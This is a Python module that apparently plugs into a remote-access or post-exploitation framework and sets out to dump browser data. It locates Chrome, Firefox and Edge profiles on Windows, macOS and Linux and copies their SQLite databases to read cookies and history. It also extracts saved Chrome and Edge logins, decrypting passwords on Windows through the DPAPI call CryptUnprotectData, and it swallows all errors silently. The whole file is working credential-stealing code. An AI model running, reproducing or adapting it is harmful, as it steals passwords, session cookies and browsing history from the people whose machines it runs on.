NAME = "browser"
VERSION = "1.0.0"
DESCRIPTION = "Dump browser cookies, history, saved passwords from Chrome/Firefox/Edge SQLite DBs."
AUTHOR = "lucy"
DEPENDENCIES = []
OS_COMPAT = ["windows", "linux", "darwin"]


import base64
import glob
import json
import os
import platform
import shutil
import sqlite3
import tempfile


class ModuleError(Exception):
    pass


def run(action: str, params: dict) -> dict:
    browser = params.get("browser", "all").lower()
    if action == "cookies":
        return _collect_cookies(browser)
    elif action == "history":
        return _collect_history(browser)
    elif action == "passwords":
        return _collect_passwords(browser)
    elif action == "all":
        result = {}
        for key, fn in [("cookies", _collect_cookies), ("history", _collect_history)]:
            try:
                r = fn(browser)
                result[key] = r.get("data", {})
            except Exception as exc:
                result[key] = {"error": str(exc)}
        return {"status": "completed", "data": result}
    return {"status": "failed", "data": None, "error": f"Unknown action: {action}"}


# ---------------------------------------------------------------------------
# Browser path discovery
# ---------------------------------------------------------------------------


def _browser_paths() -> dict[str, list[str]]:
    system = platform.system()
    home = os.path.expanduser("~")
    paths: dict[str, list[str]] = {"chrome": [], "firefox": [], "edge": []}

    if system == "Windows":
        local = os.environ.get("LOCALAPPDATA", "")
        roaming = os.environ.get("APPDATA", "")
        paths["chrome"] = [
            os.path.join(local, "Google", "Chrome", "User Data", "Default"),
            os.path.join(local, "Google", "Chrome", "User Data", "Profile 1"),
        ]
        paths["edge"] = [os.path.join(local, "Microsoft", "Edge", "User Data", "Default")]
        paths["firefox"] = glob.glob(os.path.join(roaming, "Mozilla", "Firefox", "Profiles", "*.default*"))

    elif system == "Darwin":
        paths["chrome"] = [
            os.path.join(home, "Library", "Application Support", "Google", "Chrome", "Default"),
        ]
        paths["firefox"] = glob.glob(os.path.join(home, "Library", "Application Support", "Firefox", "Profiles", "*.default*"))
        paths["edge"] = [os.path.join(home, "Library", "Application Support", "Microsoft Edge", "Default")]

    else:
        paths["chrome"] = [
            os.path.join(home, ".config", "google-chrome", "Default"),
            os.path.join(home, ".config", "chromium", "Default"),
        ]
        paths["firefox"] = glob.glob(os.path.join(home, ".mozilla", "firefox", "*.default*"))
        paths["edge"] = [os.path.join(home, ".config", "microsoft-edge", "Default")]

    return paths


def _get_targets(browser: str) -> list[tuple[str, str]]:
    all_paths = _browser_paths()
    if browser == "all":
        return [(b, p) for b, paths in all_paths.items() for p in paths if os.path.isdir(p)]
    return [(browser, p) for p in all_paths.get(browser, []) if os.path.isdir(p)]


# ---------------------------------------------------------------------------
# Cookies
# ---------------------------------------------------------------------------


def _collect_cookies(browser: str) -> dict:
    cookies = []
    for b_name, profile_dir in _get_targets(browser):
        db_path = os.path.join(profile_dir, "Cookies") if b_name != "firefox" else os.path.join(profile_dir, "cookies.sqlite")
        if not os.path.exists(db_path):
            continue
        cookies.extend(_read_cookies_db(db_path, b_name))
    return {"status": "completed", "data": {"cookies": cookies, "count": len(cookies)}}


def _read_cookies_db(path: str, browser: str) -> list:
    rows = []
    tmp = None
    try:
        with tempfile.NamedTemporaryFile(delete=False, suffix=".db") as f:
            tmp = f.name
        shutil.copy2(path, tmp)
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()

        if browser == "firefox":
            cur.execute("SELECT host, name, value, expiry, isSecure FROM moz_cookies LIMIT 2000")
            for host, name, value, expiry, secure in cur.fetchall():
                rows.append({"browser": browser, "host": host, "name": name, "value": value[:256], "secure": bool(secure)})
        else:
            try:
                cur.execute("SELECT host_key, name, value, expires_utc, is_secure FROM cookies LIMIT 2000")
                for host, name, value, expiry, secure in cur.fetchall():
                    rows.append({"browser": browser, "host": host, "name": name, "value": value[:256], "secure": bool(secure)})
            except sqlite3.OperationalError:
                cur.execute("SELECT host_key, name, encrypted_value, expires_utc, is_secure FROM cookies LIMIT 2000")
                for host, name, enc_val, expiry, secure in cur.fetchall():
                    rows.append({"browser": browser, "host": host, "name": name, "value": "[encrypted]", "secure": bool(secure)})

        conn.close()
    except Exception:
        pass
    finally:
        if tmp and os.path.exists(tmp):
            try:
                os.unlink(tmp)
            except Exception:
                pass
    return rows


# ---------------------------------------------------------------------------
# History
# ---------------------------------------------------------------------------


def _collect_history(browser: str) -> dict:
    history = []
    for b_name, profile_dir in _get_targets(browser):
        db_path = os.path.join(profile_dir, "History") if b_name != "firefox" else os.path.join(profile_dir, "places.sqlite")
        if not os.path.exists(db_path):
            continue
        history.extend(_read_history_db(db_path, b_name))
    return {"status": "completed", "data": {"history": history, "count": len(history)}}


def _read_history_db(path: str, browser: str) -> list:
    rows = []
    tmp = None
    try:
        with tempfile.NamedTemporaryFile(delete=False, suffix=".db") as f:
            tmp = f.name
        shutil.copy2(path, tmp)
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()

        if browser == "firefox":
            cur.execute("""
                SELECT p.url, p.title, h.visit_date / 1000000
                FROM moz_historyvisits h JOIN moz_places p ON h.place_id = p.id
                ORDER BY h.visit_date DESC LIMIT 1000
            """)
        else:
            cur.execute("""
                SELECT url, title, last_visit_time / 1000000 - 11644473600
                FROM urls ORDER BY last_visit_time DESC LIMIT 1000
            """)

        for url, title, ts in cur.fetchall():
            rows.append({"browser": browser, "url": url, "title": title or "", "timestamp": ts})
        conn.close()
    except Exception:
        pass
    finally:
        if tmp and os.path.exists(tmp):
            try:
                os.unlink(tmp)
            except Exception:
                pass
    return rows


# ---------------------------------------------------------------------------
# Saved passwords (Chrome only — macOS / Linux unencrypted)
# ---------------------------------------------------------------------------


def _collect_passwords(browser: str) -> dict:
    passwords = []
    for b_name, profile_dir in _get_targets(browser):
        if b_name == "firefox":
            continue
        db_path = os.path.join(profile_dir, "Login Data")
        if not os.path.exists(db_path):
            continue
        passwords.extend(_read_logins_db(db_path, b_name))
    return {"status": "completed", "data": {"passwords": passwords, "count": len(passwords)}}


def _read_logins_db(path: str, browser: str) -> list:
    rows = []
    tmp = None
    try:
        with tempfile.NamedTemporaryFile(delete=False, suffix=".db") as f:
            tmp = f.name
        shutil.copy2(path, tmp)
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()
        cur.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 500")
        for url, username, enc_password in cur.fetchall():
            decrypted = _try_decrypt_chrome_password(enc_password)
            rows.append({"browser": browser, "url": url, "username": username, "password": decrypted})
        conn.close()
    except Exception:
        pass
    finally:
        if tmp and os.path.exists(tmp):
            try:
                os.unlink(tmp)
            except Exception:
                pass
    return rows


def _try_decrypt_chrome_password(enc: bytes) -> str:
    if not enc:
        return ""
    try:
        if platform.system() == "Windows":
            import ctypes, ctypes.wintypes
            if enc[:3] == b"v10":
                return "[dpapi-v10-encrypted]"
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
            p = ctypes.create_string_buffer(enc)
            blobin = DATA_BLOB(len(enc), p)
            blobout = DATA_BLOB()
            if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout)):
                return ctypes.string_at(blobout.pbData, blobout.cbData).decode("utf-8", errors="replace")
        else:
            if enc[:3] == b"v11":
                return "[v11-encrypted-needs-secret-key]"
            return enc.decode("utf-8", errors="replace")
    except Exception:
        pass
    return "[encrypted]"
